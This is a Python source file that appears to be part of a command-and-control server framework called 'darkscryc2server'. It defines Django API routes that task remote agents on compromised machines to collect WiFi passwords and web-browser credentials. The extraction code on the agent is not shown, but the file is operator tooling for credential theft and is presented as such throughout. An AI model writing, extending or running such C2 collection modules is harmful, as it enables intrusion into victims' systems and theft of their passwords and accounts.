from uuid import UUID
from darkscryc2server.Models.schemas import GenAction
from application.services.view_base import ApiRouteV2
from darkscryc2server.Models.schemas import CommandIdentifiers
from django.shortcuts import aget_object_or_404
from application.models import Agent
from application.views.api.Schemas.general import TaskOut
from application.views.api.Schemas.Modules.collection.passwords import GatherWebCredentials
from application.shortcuts import make_task


prefix_with_agent = "/agents/{agent_id}/modules/collection/passwords"
class PasswordCollection(ApiRouteV2):
    def __init__(self, tags = ['Collection']):
        super().__init__(tags=tags, prefix=prefix_with_agent)
        self.register_routes()

    
    async def get_basic_wifi_info(self, request, agent_id:UUID, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        command = GenAction(action=CommandIdentifiers.GET_WIFI_BAISIC_INFO).xml()
        job = await make_task(
            "remote_send_command_task",
            agent_id=str(agent.AgentId),
            command=command,
            _action_name=CommandIdentifiers.GET_WIFI_BAISIC_INFO
        )
        return TaskOut(task_id=job.job_id)
    
    async def collect_web_cred(self, request, agent_id:UUID, payload:GatherWebCredentials, *args, **kwargs):
        agent = await aget_object_or_404(Agent, AgentId=agent_id)
        job = await make_task(
            "remote_send_web_cred_gather",
            agent_id=str(agent.AgentId),
            cred_type=payload.cred_type
        )
        return TaskOut(task_id=job.job_id)
    
    
    def register_routes(self):
        self.register_route(
            path="/wifi_baisc_info", 
            methods=["GET"], 
            view_func=self.get_basic_wifi_info, 
            response={200:TaskOut},
            summary="Fetch wifi passwords"
        )

        self.register_route(
            path="/collect_web_credentials", 
            methods=["POST"], 
            view_func=self.collect_web_cred, 
            response={200:TaskOut},
            summary="Fetch web credentials"
        )
